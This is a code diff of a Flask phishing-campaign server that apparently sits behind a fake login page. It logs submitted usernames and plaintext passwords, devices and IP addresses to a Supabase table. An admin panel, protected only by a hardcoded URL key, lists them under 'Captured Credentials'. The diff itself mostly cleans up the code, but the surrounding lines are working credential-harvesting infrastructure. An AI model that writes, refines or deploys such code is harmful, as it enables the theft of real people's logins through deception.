@@ -18,11 +18,7 @@ def log_event():
     try:
         data = request.get_json() or {}
         ua = request.headers.get('User-Agent', '').lower()
-        if any(x in ua for x in ['mobile', 'android', 'iphone', 'ipad']):
-            device = 'mobile'
-        else:
-            device = data.get('device', 'desktop')
-
+        device = 'mobile' if any(x in ua for x in ['mobile', 'android', 'iphone', 'ipad']) else 'desktop'
         log_data = {
             'timestamp': data.get('time', datetime.now().isoformat()),
             'event':     data.get('event', ''),
@@ -32,10 +28,8 @@ def log_event():
             'password':  data.get('password', ''),
             'ip':        request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         }
-
         supabase.table('logs').insert(log_data).execute()
         return jsonify({'status': 'ok'}), 200
-
     except Exception as e:
         print("Logging error:", str(e))
         return jsonify({'status': 'error'}), 200
@@ -61,7 +55,6 @@ def admin():
          for r in all_logs if r.get('event') == 'submit'],
         key=lambda x: x[0], reverse=True
     )
-
     visits = sorted(
         [(r.get('timestamp',''), r.get('source',''), r.get('device',''), r.get('ip',''))
          for r in all_logs if r.get('event') == 'visit'],
@@ -102,7 +95,6 @@ def admin():
   .badge-desktop {{ background: #f0e8fd; color: #6b1ab5; }}
   .empty {{ text-align: center; color: #aaa; padding: 32px; font-size: 0.9rem; }}
   .refresh {{ float: right; font-size: 0.8rem; color: #3ab5b0; text-decoration: none; }}
-  .refresh:hover {{ text-decoration: underline; }}
 </style>
 </head>
 <body>
@@ -137,14 +129,12 @@ def admin():
       <div class="label">Desktop Submits</div>
     </div>
   </div>
-
   <div class="section">
     <h2>🔐 Captured Credentials <a class="refresh" href="?key=texas2024">↻ Refresh</a></h2>
     {'<table><thead><tr><th>Time</th><th>Username</th><th>Password</th><th>Source</th><th>Device</th><th>IP Address</th></tr></thead><tbody>' +
      ''.join(f"<tr><td>{r[0][:19]}</td><td><b>{r[1]}</b></td><td>{r[2]}</td><td><span class='badge badge-{r[3]}'>{r[3]}</span></td><td><span class='badge badge-{r[4]}'>{r[4]}</span></td><td>{r[5]}</td></tr>" for r in submissions) +
      '</tbody></table>' if submissions else "<div class='empty'>No submissions yet</div>"}
   </div>
-
   <div class="section">
     <h2>👁️ Page Visits <a class="refresh" href="?key=texas2024">↻ Refresh</a></h2>
     {'<table><thead><tr><th>Time</th><th>Source</th><th>Device</th><th>IP Address</th></tr></thead><tbody>' +
@@ -154,11 +144,7 @@ def admin():
 </div>
 </body>
 </html>'''
-
     return html
 
 if __name__ == '__main__':
-    print("\n✅ Campaign server running!")
-    print("📋 Login page:  http://localhost:5000/")
-    print("📊 Admin panel: http://localhost:5000/admin?key=texas2024")
     app.run(host='0.0.0.0', port=5000, debug=False)
